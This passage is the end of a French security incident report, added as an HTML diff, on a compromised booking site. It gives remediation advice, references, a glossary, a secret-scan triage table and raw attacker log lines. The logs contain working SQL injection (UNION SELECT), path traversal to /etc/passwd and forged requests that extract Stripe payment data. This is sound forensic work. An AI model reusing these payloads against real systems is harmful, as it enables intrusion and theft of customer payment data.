+<strong>Protection</strong> : un WAF devant Apache (ModSecurity et OWASP Core Rule Set) et une limitation de débit par IP sur <code>/api/</code>.
+
+</li>
+
+<li>
+
+
+<strong>Signalement de vulnérabilités</strong> : publier un fichier <code>/.well-known/security.txt</code> et une adresse <code>security@</code> surveillée, hors filtre anti-spam. L'e-mail de l'attaquant est resté deux jours dans les spams.
+
+</li>
+
+<li>
+
+
+<strong>Cycle de sécurité</strong> : corriger les vulnérabilités d'un rapport de pentest dans des délais fixés par niveau de risque (critique : immédiat ; majeur : court terme). Refaire un test d'intrusion après correction, puis au moins une fois par an. Former les deux développeurs aux bases du développement sécurisé (OWASP Top 10).
+
+</li>
+
+</ol>
+
+<hr />
+
+<h2 id="8-références">8. Références</h2>
+<ul>
+
+<li>
+
+
+ANSSI, <em>Prestataires d'audit de la sécurité des systèmes d'information (PASSI) : référentiel d'exigences</em>, échelle de classification des vulnérabilités.
+
+</li>
+
+<li>
+
+
+OWASP, <em>Top 10:2021</em> ; <em>API Security Top 10:2023</em> ; <em>Web Security Testing Guide (WSTG) v4.2</em>.
+
+</li>
+
+<li>
+
+
+OWASP Cheat Sheet Series : <em>SQL Injection Prevention</em>, <em>Server-Side Request Forgery Prevention</em>, <em>Cross Site Scripting Prevention</em>, <em>HTTP Security Response Headers</em>, <em>Secrets Management</em>, <em>Password Storage</em>.
+
+</li>
+
+<li>
+
+
+MITRE, <em>Common Weakness Enumeration (CWE)</em> : CWE-22, 79, 89, 330, 359, 489, 497, 540, 598, 693, 798, 918.
+
+</li>
+
+<li>
+
+
+Règlement (UE) 2016/679 (RGPD), articles 33 et 34.
+
+</li>
+
+<li>
+
+
+Alharbi M., <em>Writing a Penetration Testing Report</em>, SANS Institute, 2010.
+
+</li>
+
+</ul>
+
+<hr />
+
+<h2 id="9-glossaire">9. Glossaire</h2>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Terme</th>
+<th>Définition</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CSP</strong> (<em>Content-Security-Policy</em>)</td>
+<td>En-tête HTTP qui indique au navigateur les sources de scripts autorisées. Il bloque l'exécution de scripts injectés.</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>Catalogue de référence des types de faiblesses logicielles (MITRE).</td>
+</tr>
+<tr>
+<td><strong>Exfiltration</strong></td>
+<td>Extraction non autorisée de données hors du système.</td>
+</tr>
+<tr>
+<td><strong>IoC</strong> (<em>Indicator of Compromise</em>)</td>
+<td>Trace technique (ligne de journal, IP, fichier…) qui prouve une compromission.</td>
+</tr>
+<tr>
+<td><strong>Injection SQL</strong> (SQLi)</td>
+<td>Insertion de code SQL dans un paramètre, qui modifie la requête exécutée par la base de données.</td>
+</tr>
+<tr>
+<td><strong><code>UNION SELECT</code></strong></td>
+<td>Technique d'injection SQL qui ajoute au résultat les lignes d'une autre table.</td>
+</tr>
+<tr>
+<td><strong>Path traversal</strong></td>
+<td>Utilisation de séquences <code>../</code> dans un chemin de fichier pour lire des fichiers en dehors du répertoire prévu.</td>
+</tr>
+<tr>
+<td><strong>SSRF</strong> (<em>Server-Side Request Forgery</em>)</td>
+<td>Faille qui amène le serveur à envoyer une requête choisie par l'attaquant, ici vers l'API Stripe avec la clé du marchand.</td>
+</tr>
+<tr>
+<td><strong>XSS stocké</strong></td>
+<td>Script malveillant enregistré dans les données du site et exécuté dans le navigateur de chaque visiteur.</td>
+</tr>
+<tr>
+<td><strong>User-Agent</strong></td>
+<td>En-tête HTTP qui identifie le navigateur ou l'outil à l'origine d'une requête.</td>
+</tr>
+<tr>
+<td><strong>Werkzeug</strong></td>
+<td>Serveur de développement de Flask, non prévu pour la production. En mode debug, il affiche le détail des erreurs.</td>
+</tr>
+<tr>
+<td><strong>WAF</strong></td>
+<td>Pare-feu applicatif qui filtre les requêtes HTTP malveillantes.</td>
+</tr>
+<tr>
+<td><strong>Gitleaks</strong></td>
+<td>Outil de détection de secrets (clés, mots de passe) dans un dépôt Git et son historique.</td>
+</tr>
+<tr>
+<td><strong>Bug bounty</strong></td>
+<td>Programme de récompense pour les chercheurs qui signalent des vulnérabilités de manière responsable.</td>
+</tr>
+</tbody></table></div>
+
+<hr />
+
+<h2 id="10-annexes">10. Annexes</h2>
+<h3 id="annexe-a-triage-du-scan-gitleaks">Annexe A : Triage du scan Gitleaks</h3>
+<p>
+
+Commande : <code>gitleaks git . -f json -r gitleaks.json</code>. Résultat : 31 commits scannés, 113 alertes.
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Règle</th>
+<th>Fichier</th>
+<th>Commit</th>
+<th>Nb</th>
+<th>Verdict</th>
+</tr></thead><tbody>
+<tr>
+<td><code>stripe-access-token</code></td>
+<td><code>docker-compose.yml</code> (l. 10)</td>
+<td><code>4aec6cd</code> → HEAD</td>
+<td>1</td>
+<td><strong>Vrai positif</strong> : clé secrète <code>sk_test_51R…</code> (D6)</td>
+</tr>
+<tr>
+<td><code>stripe-access-token</code></td>
+<td><code>back/services/stripe.py</code> (l. 11 et 35)</td>
+<td><code>ef5503c</code></td>
+<td>2</td>
+<td><strong>Vrai positif</strong> : clé restreinte <code>rk_test_51R…</code> (D6)</td>
+</tr>
+<tr>
+<td><code>generic-api-key</code></td>
+<td><code>apache.log</code></td>
+<td><code>03e4a50</code></td>
+<td>110</td>
+<td><strong>Vrai positif</strong> : <code>checkout_confirmation_secret</code> journalisés en clair dans les URL de retour Stripe (cf. D4, observation CWE-598)</td>
+</tr>
+</tbody></table></div>
+
+<h3 id="annexe-b-extraits-bruts-du-journal-14910223540">Annexe B : Extraits bruts du journal (<code>149.102.235.40</code>)</h3>
+<div class="codeblock"><div class="hl"><pre><span></span>[07/Nov/2026:10:52:23 +0200] &quot;GET / HTTP/1.1&quot; 200 616 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:10:53:21 +0200] &quot;GET /cgi-bin/status HTTP/1.1&quot; 404 35 &quot;-&quot; &quot;dirsearch/v0.4.2&quot;
+[07/Nov/2026:11:11:37 +0200] &quot;GET /api/rooms/?category=hut%27%20OR%201=1%20-- HTTP/1.1&quot; 200 311 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:16:44 +0200] &quot;GET /api/rooms/?category=test%27%20UNION%20SELECT%20bookings.id,%20bookings.reference,%20bookings.checkout_confirmation_secret,%20bookings.stripe_checkout_session_id,%200,%200,%200,%200%20FROM%20bookings%20WHERE%20bookings.reference%20=%20%2785A1NBEJ%27%20-- HTTP/1.1&quot; 200 200 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:16:54 +0200] &quot;POST /api/bookings/85A1NBEJ/confirm-checkout HTTP/1.1&quot; 200 22 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:18:49 +0200] &quot;GET /api/uploads/?name=test.jpg HTTP/1.1&quot; 500 23187 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:18:56 +0200] &quot;GET /api/uploads/?name=../app.py HTTP/1.1&quot; 200 1152 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:19:10 +0200] &quot;GET /api/uploads/?name=../../etc/passwd HTTP/1.1&quot; 200 1182 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:19:43 +0200] &quot;GET /api/bookings/85A1NBEJ/checkout-lines?checkout_session_id=../../customers%23 HTTP/1.1&quot; 200 19128640 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+[07/Nov/2026:11:23:13 +0200] &quot;GET /api/bookings/85A1NBEJ/checkout-lines?checkout_session_id=../../customers/cus_itZV9C9MEpGwsV/payment_methods%23 HTTP/1.1&quot; 200 1961 &quot;-&quot; &quot;python-requests/2.25.0&quot;
+[07/Nov/2026:11:34:54 +0200] &quot;GET / HTTP/1.1&quot; 200 616 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) Gecko/20100101 Firefox/52.0&quot;
+</pre></div>
+</div>
+<h3 id="annexe-c-répartition-du-trafic-de-lattaquant-par-user-agent">Annexe C : Répartition du trafic de l'attaquant par User-Agent</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>User-Agent</th>
+<th>Requêtes</th>
+<th>Usage</th>
+</tr></thead><tbody>
+<tr>
+<td><code>dirsearch/v0.4.2</code></td>
+<td>6 093</td>
+<td>Énumération de chemins (toutes en 404)</td>
+</tr>
+<tr>
+<td><code>python-requests/2.25.0</code></td>
+<td>623</td>
+<td>Exfiltration des moyens de paiement</td>
+</tr>
+<tr>
+<td><code>Firefox/52.0</code> (macOS 10.12.5)</td>
+<td>67</td>
+<td>Navigation et exploitation manuelle</td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>6 783</strong></td>
+<td></td>
+</tr>
+</tbody></table></div>
+
+</body>
+</html>
